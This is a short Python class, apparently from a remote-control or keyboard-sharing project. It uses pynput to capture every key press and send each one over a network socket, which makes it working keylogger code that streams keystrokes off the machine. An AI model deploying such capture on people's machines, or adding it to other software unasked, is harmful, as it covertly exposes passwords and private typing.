from pynput.keyboard import Listener


class Virtual_keyboard:

    def __init__(self, send_socket):
        self.send_socket = send_socket

    def on_press(self, key):
        self.send_socket.send("Key pressed {0}".format(key).encode())

    def listen(self, bolli):
        with Listener(on_press=self.on_press) as listener:
            while bolli.get():
                continue
